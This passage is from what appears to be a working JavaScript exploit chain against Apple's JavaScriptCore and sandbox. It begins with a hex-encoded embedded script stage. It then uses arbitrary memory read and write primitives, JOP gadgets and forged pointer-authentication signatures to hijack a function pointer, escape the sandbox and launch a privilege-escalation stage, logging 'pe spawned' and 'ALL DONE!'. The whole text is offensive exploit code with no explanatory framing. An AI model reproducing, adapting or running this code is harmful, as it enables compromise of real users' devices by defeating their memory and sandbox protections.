0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x6b, 0x65, 0x79, 0x5f, 0x74, 0x79, 0x70, 0x65, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x5f, 0x62, 0x5f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x30, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x62, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x5f, 0x62, 0x5f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x28, 0x70, 0x74, 0x72, 0x2c, 0x20, 0x63, 0x74, 0x78, 0x2c, 0x20, 0x31, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x78, 0x70, 0x61, 0x63, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x74, 0x72, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x5f, 0x6e, 0x65, 0x77, 0x20, 0x3d, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x28, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x2c, 0x30, 0x78, 0x63, 0x32, 0x64, 0x30, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x28, 0x78, 0x70, 0x61, 0x63, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x5f, 0x6e, 0x65, 0x77, 0x2c, 0x20, 0x70, 0x74, 0x72, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x4c, 0x4f, 0x47, 0x5f, 0x43, 0x53, 0x54, 0x52, 0x49, 0x4e, 0x47, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x73, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x28, 0x53, 0x59, 0x53, 0x4c, 0x4f, 0x47, 0x2c, 0x20, 0x30, 0x6e, 0x2c, 0x20, 0x73, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x4c, 0x4f, 0x47, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x73, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x28, 0x73, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x6d, 0x73, 0x67, 0x20, 0x3d, 0x20, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5b, 0x5d, 0x5b, 0x6d, 0x73, 0x67, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x4c, 0x4f, 0x47, 0x5f, 0x43, 0x53, 0x54, 0x52, 0x49, 0x4e, 0x47, 0x28, 0x67, 0x65, 0x74, 0x5f, 0x63, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x6d, 0x73, 0x67, 0x29, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x7d, 0x29, 0x28, 0x29, 0x3b, 0x0
      ]);
      pe_stage1_js_data = gpuCopyBuffer(read64(addrof(pe_stage1_js_data_array) + 0x10n), BigInt(pe_stage1_js_data_array.length));
      pe_main_js_data = get_cstring(getJS('pe_main.js')); //local version
    } else {
      pe_stage1_js_data = g_pe_stage1_js_data;
      pe_main_js_data = g_pe_main_js_data;
      pe_post_js_data = g_pe_post_js_data;
    }
    let pe_stage_1_cfstring = mpd_create_cfstring(pe_stage1_js_data);
    let pe_main_cfstring = mpd_create_cfstring(pe_main_js_data);
    let arr = mpd_setup_fcall_jopchain();
    let jsvm_fcall_buff = arr[0];
    let jsvm_fcall_pc = arr[1];
    let jsvm_fcall_args = arr[2];
    mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"), 2n);
    let mpd_jsc_class = mpd_objc_getClass(mpd_get_cstring("JSContext"));
    let ctx = mpd_objc_alloc_init(mpd_jsc_class);
    let isnan_value = mpd_objectForKeyedSubscript(ctx, "isNaN");
    let isnan_func_addr = mpd_read64(isnan_value + 0x8n);
    let isnan_executable_addr = mpd_read64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    mpd_evaluateScript(ctx, pe_stage_1_cfstring);
    let unboxed_arr_value = mpd_objectForKeyedSubscript(ctx, "unboxed_arr");
    let unboxed_arr_addr = mpd_read64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = mpd_objectForKeyedSubscript(ctx, "boxed_arr");
    let boxed_arr_addr = mpd_read64(boxed_arr_value + 0x8n);
    let boxed_arr_buffer = mpd_read64(boxed_arr_addr + 0x8n);
    mpd_write64(unboxed_arr_addr + 0x8n, boxed_arr_buffer);
    let rw_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array") + 0x8n);
    let control_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array") + 0x8n);
    mpd_write64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array_8") + 0x8n);
    let control_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array_8") + 0x8n);
    mpd_write64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = mpd_pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    LOG(`[MPD] signed_fcall_addr: ${signed_fcall_addr.hex()}`);
    LOG(`[MPD] isnan_code_ptr: ${isnan_code_ptr.hex()}`);
    mpd_write64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = mpd_objectForKeyedSubscript(ctx, "func_offsets_array");
    let new_func_offsets_addr = mpd_read64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = mpd_read64(new_func_offsets_addr + 0x10n);
    let DLSYM = func_resolve("dlsym").noPAC();
    let idx = 0n;
    let js_inputs = mpd_malloc(0x100n);
    mpd_write64(js_inputs, pe_stage_1_cfstring);
    mpd_write64(js_inputs + 0x8n, 0n);
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, pacia(DLSYM.noPAC(), 0xc2d0n));
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, pacia(dyld_signPointer_gadget.noPAC(), 0xc2d0n));
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, js_inputs);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, 0n);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, shared_cache_slide);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_buff);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_pc);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_fcall_args);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, _CFObjectCopyProperty);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, load_x1x3x8);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, fcall_14_args_write_x8);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_isNAN_fcall_gadget);
    idx += 0x1n;
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, jsvm_isNAN_fcall_gadget2);
    idx += 0x1n;
    LOG(`xpac_gadget:${xpac_gadget.hex()}`);
    mpd_write64(new_func_offsets_buffer + idx * 0x8n, xpac_gadget);
    idx += 0x1n;
    mpd_evaluateScript_nowait_exit(ctx, pe_main_cfstring);
    LOG("[MPD] pe spawned");
  }
  sbx1sbx1_interval = Date.now();
  let sbx1sbx1_succeeded = sbx1sbx1();
  sbx1sbx1_interval = Date.now() - sbx1sbx1_interval;
  LOG(`[profiler] Sbx1 EXP bypass took ${exp_bypass_interval} ms`);
  if (sbx1sbx1_succeeded) {
    LOG(`[profiler] Sbx1 took ${sbx1sbx1_interval} ms`);
  } else {
    LOG(`[profiler] Sbx1 failed in ${sbx1sbx1_interval} ms`);
  }
  if (sbx1sbx1_succeeded) {
    spawn_pe();
  }
  LOG("closing remaker_connection: " + remaker_connection);
  xpc_connection_cancel(remaker_connection);
  LOG = function (msg) {
    log('sbx0: ' + msg);
  };
  sbx1_end = Date.now();
  LOG("ALL DONE!");
  //exit(0n);
})();
